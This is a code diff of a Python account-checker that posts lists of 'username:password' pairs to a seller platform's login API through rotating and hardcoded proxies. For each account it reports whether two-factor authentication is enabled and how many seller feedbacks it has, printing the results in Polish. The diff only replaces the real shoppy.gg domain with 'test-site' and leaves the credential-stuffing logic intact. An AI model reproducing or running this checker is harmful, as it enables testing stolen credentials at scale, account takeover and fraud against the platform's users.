@@ -35,7 +35,7 @@ def check(x):
         })
         # proxy_index = random.randint(0, len(ip_addresses) - 1)
         ttp = ProxyManager("HTTP_PROXY")
-        conn = http.request('POST','https://shoppy.gg/api/v1/auth/login',body=payload,timeout=20.0,headers={'Content-Type': 'application/json'})
+        conn = http.request('POST','https://test-site/api/v1/auth/login',body=payload,timeout=20.0,headers={'Content-Type': 'application/json'})
         # url = urljoin('',ourl)
         try:
             checks+=1
@@ -44,7 +44,7 @@ def check(x):
              fa2 = True
             else:
              fa2 = False
-            d= http.request('GET','https://shoppy.gg/api/v1/public/seller/{}'.format(x.split(':')[0]))
+            d= http.request('GET','https://test-site/api/v1/public/seller/{}'.format(x.split(':')[0]))
             data = json.loads(d.data)
             feedbacks = data["user"]["feedbacks"]
             print("2FA: {} - {}:{} Liczba Feedbackow:".format(fa2,x.split(':')[0],x.split(':')[1]),len(feedbacks))
@@ -100,14 +100,14 @@ class MyThread(threading.Thread):
                         'password': x.split(':')[1],
                         })
                         http = ProxyManager("http://185.30.232.46:19999/")
-                        conn = http.request('POST','https://shoppy.gg/api/v1/auth/login',body=payload,timeout=20.0,headers={'Content-Type': 'application/json'})
+                        conn = http.request('POST','https://test-site/api/v1/auth/login',body=payload,timeout=20.0,headers={'Content-Type': 'application/json'})
                         try:
                          data = json.loads(conn.data)
                          if data["twofa_enabled"]:
                           fa2 = True
                          else:
                           fa2 = False
-                         d= http.request('GET','https://shoppy.gg/api/v1/public/seller/{}'.format(x.split(':')[0]))
+                         d= http.request('GET','https://test-site/api/v1/public/seller/{}'.format(x.split(':')[0]))
                          data = json.loads(d.data)
                          feedbacks = data["user"]["feedbacks"]
                          print("2FA: {} - {}:{} Liczba Feedbackow:".format(fa2,x.split(':')[0],x.split(':')[1]),len(feedbacks))
